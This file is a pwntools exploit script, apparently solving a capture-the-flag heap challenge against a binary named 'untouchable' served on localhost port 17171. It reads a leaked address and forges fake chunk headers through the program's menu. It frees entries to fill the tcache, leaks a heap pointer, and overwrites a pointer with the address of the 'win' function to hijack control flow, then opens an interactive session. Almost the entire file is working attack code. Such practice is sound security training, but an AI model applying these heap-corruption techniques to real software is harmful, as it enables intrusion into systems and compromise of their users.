#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template mian
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'untouchable')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()
io = remote("localhost", 17171)
leak = int(io.recvline().split(b": ")[1], 16)
print("LEAK: ", hex(leak))

# print(leak)
def add(ind, id):
    io.sendlineafter(b"menu\n", b'1')
    io.sendlineafter(b"write?\n", ind)
    io.sendafter(b'byte', id)

def addinfo(ind, data):
    io.sendlineafter(b"menu\n", b'3')
    io.sendlineafter(b"write?\n", ind)
    io.sendafter(b'add?\n', data)

def delinfo(ind):
    io.sendlineafter(b"menu\n", b'4')
    io.sendlineafter(b"del?\n", ind)

def printid(ind):
    io.sendlineafter(b"menu\n", b'2')
    io.sendlineafter(b"read?\n", ind)

for i in range(11, 21):
    add(str(i), b'1'*0x8)
    addinfo(str(i), b'1')
# pause()

# add(b'0', b'1')
# addinfo(b'0', b'1')

add(b'1', b'\x20'+ b'\x00'*7 + p64(leak+0x20))
add(b'2', b'\x00'*8 + b'\x20')
# delinfo(b'1')
add(b'3', b'\x20'+ b'\x00'*7 + p64(leak+0x50))
add(b'4', b'\x00'*8 + b'\x20')
for i in range(11, 18):
    delinfo(str(i))
# add(b'17', b'\x00'*0x10+b'\x34\x12')
# pause()
delinfo(b'1')
# addinfo(b'15', b'1')
# pause()
delinfo(b"3")
print(hex(exe.symbols['win']))
# pause()
printid(b'3')
a = io.recvuntil("\n")[:-1][::-1]
leak1 = int(a[:8].hex(), 16)

print(hex(leak1))

add(b'0', b'0')
add(b'3', b'\x20' + b'\x00'*7 + p64(leak1))
# pause()
addinfo(b'3', p64(0) + p64(exe.symbols["win"]))

io.sendline(b'7')
io.sendline(b'3')

io.interactive()


